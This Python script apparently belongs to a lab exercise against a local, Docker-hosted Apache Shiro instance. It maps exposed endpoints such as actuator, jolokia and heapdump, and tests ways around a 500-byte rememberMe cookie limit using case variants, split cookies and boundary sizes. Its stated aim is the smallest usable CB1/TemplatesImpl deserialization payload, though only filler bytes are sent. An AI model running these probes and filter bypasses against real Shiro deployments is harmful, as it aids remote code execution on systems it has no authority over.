# -*- coding: utf-8 -*-
"""Final round - Shiro (Task 2b): surface map + 3001 edge cases.

Faces hunted:
  - non-rememberMe app surfaces (actuator/jolokia/env/heapdump/etc.)
  - 3001 bypass shapes: case-variant cookie name, split cookies (two values
    each <=500B), tiny rememberMe - all checked against Shiro-side semantics
  - measured payload floor: smallest usable CB1+TemplatesImpl+marker payload
Truth = marker in /tmp (AA: only /run/aa-tmp/shiro writable) or infra callback.
"""
import subprocess
import time

import requests
import urllib3

urllib3.disable_warnings()

BASE = "http://127.0.0.1:18383"
s = requests.Session()
s.trust_env = False
s.verify = False
s.headers["User-Agent"] = "Mozilla/5.0"


def show(label, r):
    loc = r.headers.get("Location", "-")
    setc = "deleteMe" in (r.headers.get("Set-Cookie") or "")
    print("[*] %-44s HTTP %s | len=%d | loc=%s | deleteMe=%s" %
          (label, r.status_code, len(r.content), loc[:60], setc))


print("=== surface map ===")
for path in ["/", "/index", "/login", "/doLogin", "/admin", "/actuator", "/actuator/env",
             "/jolokia", "/env", "/heapdump", "/favicon.ico", "/shiro", "/web"]:
    try:
        r = s.get(BASE + path, timeout=20, allow_redirects=False)
        show(path, r)
    except Exception as e:
        print("[!]", path, e)

print("\n=== 3001 edge cases ===")
big = "A" * 600
# case variant
r = s.get(BASE + "/", headers={"Cookie": "RememberMe=" + big}, timeout=20, allow_redirects=False)
show("600B 'RememberMe' (capital R)", r)
# split two cookies each <=500
half1, half2 = "A" * 400, "A" * 400
r = s.get(BASE + "/", headers={"Cookie": "rememberMe=" + half1 + "; rememberMe=" + half2},
          timeout=20, allow_redirects=False)
show("2x400B rememberMe cookies", r)
# boundary: exactly 500
r = s.get(BASE + "/", headers={"Cookie": "rememberMe=" + "A" * 500}, timeout=20,
          allow_redirects=False)
show("exactly 500B rememberMe", r)
# control: 501B -> must 403
r = s.get(BASE + "/", headers={"Cookie": "rememberMe=" + "A" * 501}, timeout=20,
          allow_redirects=False)
show("501B rememberMe (control)", r)

print("\n=== truth ===")
out = subprocess.run(["docker", "exec", "multi-round-lab-shiro-1", "sh", "-c",
                      "ls -l --full-time /run/aa-tmp/shiro/ 2>/dev/null | grep -v rasplog; ls /tmp 2>/dev/null"],
                     capture_output=True, text=True, errors="replace")
print((out.stdout + out.stderr).strip())
